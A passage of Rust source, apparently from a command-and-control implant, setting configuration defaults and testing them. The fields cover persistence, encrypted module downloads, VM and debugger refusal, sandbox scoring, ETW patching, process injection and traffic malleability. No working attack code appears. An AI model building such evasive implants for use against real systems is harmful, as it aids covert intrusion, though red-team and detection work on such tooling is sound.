                allowed_paths.push(module_cache_dir.clone());
            }
        }

        Self {
            allowed_paths,
            heartbeat_interval_secs: default_heartbeat(),
            persistence_enabled: false,
            module_repo_url: default_module_repo(),
            module_aes_key: None,
            module_verify_key: None,
            module_cache_dir,
            traffic_profile: TrafficProfile::default(),
            required_domain: None,
            refuse_in_vm: false,
            refuse_when_debugged: false,
            sandbox_score_threshold: None,
            server_cert_fingerprint: None,
            port_scan_concurrency: default_port_scan_concurrency(),
            port_scan_timeout_ms: default_port_scan_timeout(),
            sleep: SleepConfig::default(),
            malleable_profile: MalleableProfile::default(),
            exec_strategy: ExecStrategy::Indirect,
            persistence: PersistenceConfig::default(),
            etw_patch_method: None,
            reencode_interval_secs: default_reencode_interval(),
            injection: InjectionConfig::default(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(target_os = "linux")]
    #[test]
    fn default_allowed_paths_linux() {
        let paths = default_allowed_paths();
        assert!(paths.iter().any(|p| p == "/var/log"), "Linux should include /var/log");
        assert!(paths.iter().any(|p| p == "/home"), "Linux should include /home");
        assert!(paths.iter().any(|p| p == "/tmp"), "Linux should include /tmp");
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn default_allowed_paths_macos() {
        let paths = default_allowed_paths();
        assert!(paths.iter().any(|p| p == "/Users"), "macOS should include /Users");
        assert!(paths.iter().any(|p| p == "/tmp"), "macOS should include /tmp");
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn default_allowed_paths_windows() {
        let paths = default_allowed_paths();
        assert!(
            paths.iter().any(|p| p.contains("Users")),
            "Windows should include Users path"
        );
        assert!(
            paths.iter().any(|p| p.contains("Temp")),
            "Windows should include Temp path"
        );
    }

    #[test]
    fn default_config_module_cache_dir_is_accessible() {
        let cfg = Config::default();
        let cache = &cfg.module_cache_dir;
        // The module_cache_dir must be reachable via allowed_paths
        // (either directly or through a parent prefix).
        let reachable = cfg.allowed_paths.iter().any(|p| {
            cache.starts_with(p.as_str()) || p.starts_with(cache.as_str())
        });
        assert!(
            reachable,
            "module_cache_dir '{}' is not covered by allowed_paths: {:?}",
            cache,
            cfg.allowed_paths
        );
    }

    #[test]
    fn default_cloud_fallback_whitelisting_is_disabled() {
        let profile = MalleableProfile::default();
        assert!(!profile.cloud_instance_allow_without_imds);
        assert!(profile.cloud_instance_fallback_ids.is_empty());
        assert!(profile.vm_detection_extra_hypervisor_names.is_empty());
    }
}
